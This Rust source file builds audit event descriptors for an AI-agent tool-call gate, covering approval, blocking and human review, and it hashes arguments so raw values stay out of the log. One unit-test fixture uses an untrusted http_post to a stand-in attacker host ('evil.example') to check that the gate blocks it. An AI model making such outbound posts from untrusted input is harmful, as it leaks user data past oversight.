//! Pure mapping from a gate decision to ATEP event descriptors.
//!
//! Like the governance crate's `events` module, this is intentionally crypto-
//! and IO-free: it decides *what* events a gate passage should produce
//! (`stream` + `event_type` + JSON `payload`). Sealing them into signed,
//! hash-linked ATEP events and appending them to a store is the embedder's job
//! (the CLI does this). Keeping the mapping pure makes the event shape
//! unit-testable without keys or a filesystem, and keeps it deterministic.
//!
//! Raw arguments are **never** placed in a payload — only their
//! content-addressed BLAKE3 hash — so a sensitive tool argument never leaks
//! into the audit trail in the clear.

use serde::Serialize;

use crate::decision::{GateDecision, GateOutcome};
use crate::toolcall::{HumanApproval, ToolCall};

/// Canonical, stable `event_type` strings emitted by the gate. Downstream
/// consumers match on these.
pub const EVENT_TOOL_CALL_PROPOSED: &str = "tool.call.proposed";
pub const EVENT_POLICY_CHECK_PERFORMED: &str = "policy.check.performed";
pub const EVENT_TOOL_CALL_APPROVED: &str = "tool.call.approved";
pub const EVENT_TOOL_CALL_BLOCKED: &str = "tool.call.blocked";
pub const EVENT_TOOL_CALL_EXECUTED: &str = "tool.call.executed";
pub const EVENT_HUMAN_REVIEW_REQUESTED: &str = "human.review.requested";
pub const EVENT_HUMAN_REVIEW_APPROVED: &str = "human.review.approved";
pub const EVENT_HUMAN_REVIEW_REJECTED: &str = "human.review.rejected";
pub const EVENT_HUMAN_REVIEW_MODIFIED: &str = "human.review.modified";

/// Which ATEP stream a descriptor belongs on. The gate decision chain lands on
/// `Policy`; human interruptions land on the signed `Governance` stream.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum GateStream {
    Policy,
    Governance,
}

/// A single gate event ready to be sealed: its target stream, `event_type`, and
/// JSON `payload`.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct GateEventDescriptor {
    pub stream: GateStream,
    pub event_type: String,
    pub payload: serde_json::Value,
}

impl GateEventDescriptor {
    fn new(stream: GateStream, event_type: &str, payload: serde_json::Value) -> Self {
        Self {
            stream,
            event_type: event_type.to_string(),
            payload,
        }
    }

    /// `atep://schemas/v1/<event_type-with-slashes>` — mirrors the convention
    /// used by `atep append` and the governance stream.
    pub fn payload_schema_uri(&self) -> String {
        format!("atep://schemas/v1/{}", self.event_type.replace('.', "/"))
    }
}

/// Content-addressed hash of the arguments, so the proposal is auditable
/// without exposing the (possibly sensitive) payload.
fn arguments_hash(args: &serde_json::Value) -> String {
    // serde_json serializes object keys in sorted order by default, so this is
    // stable for a given logical value.
    let canon = serde_json::to_vec(args).unwrap_or_default();
    format!("blake3:{}", hex::encode(blake3::hash(&canon).as_bytes()))
}

/// The descriptor sequence for a single gate passage:
/// `tool.call.proposed` → `policy.check.performed` → terminal
/// (`tool.call.approved` | `tool.call.blocked` | `human.review.requested`).
pub fn gate_descriptors(call: &ToolCall, outcome: &GateOutcome) -> Vec<GateEventDescriptor> {
    let proposed = GateEventDescriptor::new(
        GateStream::Policy,
        EVENT_TOOL_CALL_PROPOSED,
        serde_json::json!({
            "tool": call.tool,
            "provenance": call.provenance.label(),
            "scopes": call.scopes,
            "destinations": call.resolved_destinations(),
            "arguments_hash": arguments_hash(&call.arguments),
        }),
    );

    let check = GateEventDescriptor::new(
        GateStream::Policy,
        EVENT_POLICY_CHECK_PERFORMED,
        serde_json::json!({
            "tool": call.tool,
            "decision": outcome.decision,
            "reasons": outcome.reasons,
            "rego": {
                "allowed": outcome.policy.allowed,
                "denies": outcome.policy.denies,
                "policies": outcome.policy.policies,
            },
        }),
    );

    let terminal = match outcome.decision {
        GateDecision::Allow => GateEventDescriptor::new(
            GateStream::Policy,
            EVENT_TOOL_CALL_APPROVED,
            serde_json::json!({ "tool": call.tool }),
        ),
        GateDecision::Block => GateEventDescriptor::new(
            GateStream::Policy,
            EVENT_TOOL_CALL_BLOCKED,
            serde_json::json!({
                "tool": call.tool,
                "reasons": outcome.reasons,
            }),
        ),
        GateDecision::RequireHumanApproval => GateEventDescriptor::new(
            GateStream::Governance,
            EVENT_HUMAN_REVIEW_REQUESTED,
            serde_json::json!({
                "tool": call.tool,
                "reasons": outcome.reasons,
            }),
        ),
    };

    vec![proposed, check, terminal]
}

/// The descriptor sequence for a human resolving a held call. The
/// `human.review.*` event carries the reviewer's role / justification /
/// timestamp and is sealed (signed) by the embedder. On approval the call's
/// `tool.call.approved` (and, when `executed`, `tool.call.executed`) follow;
/// otherwise `tool.call.blocked`.
pub fn resolution_descriptors(
    call: &ToolCall,
    approval: &HumanApproval,
    executed: bool,
) -> Vec<GateEventDescriptor> {
    let event_type = match approval.disposition {
        crate::toolcall::Disposition::Approved => EVENT_HUMAN_REVIEW_APPROVED,
        crate::toolcall::Disposition::Rejected => EVENT_HUMAN_REVIEW_REJECTED,
        crate::toolcall::Disposition::Modified => EVENT_HUMAN_REVIEW_MODIFIED,
    };
    let review = GateEventDescriptor::new(
        GateStream::Governance,
        event_type,
        serde_json::json!({
            "tool": call.tool,
            "disposition": approval.disposition,
            "role": approval.role,
            "justification": approval.justification,
            "timestamp": approval.timestamp,
        }),
    );

    let mut out = vec![review];
    if approval.is_approved() {
        out.push(GateEventDescriptor::new(
            GateStream::Policy,
            EVENT_TOOL_CALL_APPROVED,
            serde_json::json!({ "tool": call.tool, "via": "human_review" }),
        ));
        if executed {
            out.push(GateEventDescriptor::new(
                GateStream::Policy,
                EVENT_TOOL_CALL_EXECUTED,
                serde_json::json!({ "tool": call.tool }),
            ));
        }
    } else {
        out.push(GateEventDescriptor::new(
            GateStream::Policy,
            EVENT_TOOL_CALL_BLOCKED,
            serde_json::json!({ "tool": call.tool, "via": "human_review" }),
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{GateRuleSet, ToolBoundaryGate};
    use agenomic_policy::PolicyBundle;

    fn outcome(json: serde_json::Value) -> (ToolCall, GateOutcome) {
        let call: ToolCall = serde_json::from_value(json).unwrap();
        let gate = ToolBoundaryGate::new(GateRuleSet::default());
        let out = gate.evaluate(&call, &PolicyBundle::default()).unwrap();
        (call, out)
    }

    #[test]
    fn block_emits_proposed_check_blocked() {
        let (call, out) = outcome(serde_json::json!({
            "tool": "http_post", "provenance": "untrusted",
            "arguments": { "url": "https://evil.example/x", "body": "data" }
        }));
        let d = gate_descriptors(&call, &out);
        assert_eq!(d.len(), 3);
        assert_eq!(d[0].event_type, EVENT_TOOL_CALL_PROPOSED);
        assert_eq!(d[1].event_type, EVENT_POLICY_CHECK_PERFORMED);
        assert_eq!(d[2].event_type, EVENT_TOOL_CALL_BLOCKED);
        // Raw args never appear; only their hash does.
        assert!(d[0].payload["arguments_hash"]
            .as_str()
            .unwrap()
            .starts_with("blake3:"));
        assert!(d[0].payload.get("arguments").is_none());
    }

    #[test]
    fn review_terminal_lands_on_governance() {
        let (call, out) = outcome(serde_json::json!({
            "tool": "delete_record", "provenance": "trusted",
            "arguments": { "id": 42 }
        }));
        let d = gate_descriptors(&call, &out);
        assert_eq!(d[2].event_type, EVENT_HUMAN_REVIEW_REQUESTED);
        assert_eq!(d[2].stream, GateStream::Governance);
    }

    #[test]
    fn schema_uri_uses_slash_form() {
        let d = GateEventDescriptor::new(
            GateStream::Policy,
            EVENT_TOOL_CALL_PROPOSED,
            serde_json::Value::Null,
        );
        assert_eq!(
            d.payload_schema_uri(),
            "atep://schemas/v1/tool/call/proposed"
        );
    }
}
